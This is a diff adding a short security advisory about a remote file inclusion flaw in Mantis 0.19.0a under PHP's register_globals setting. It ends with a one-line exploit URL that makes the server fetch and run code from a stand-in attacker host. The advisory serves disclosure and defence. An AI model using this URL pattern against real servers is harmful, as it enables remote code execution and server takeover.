@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/10993/info
+
+Mantix is reportedly susceptible to a remote server-side script execution vulnerability. This vulnerability only presents itself when PHP is configured on the hosting computer with 'register_globals = on'.
+
+When PHP is configured to register global variables, an attacker can override variables used by the application in require() statements. By including a URI reference to a web server hosting a malicious script in GET, POST, or cookie data, an attacker can cause the PHP interpreter on the server hosting the affected package to request and execute attacker-supplied code.
+
+This vulnerability could be exploited by a remote attacker to execute arbitrary script code in the context of the server hosting the affected application.
+
+Version 0.19.0a is reported vulnerable to this issue. Other versions are also likely affected. 
+
+http://www.example.com/mantis/core/bug_api.php?t_core_dir=http://attackers.example.com/ 
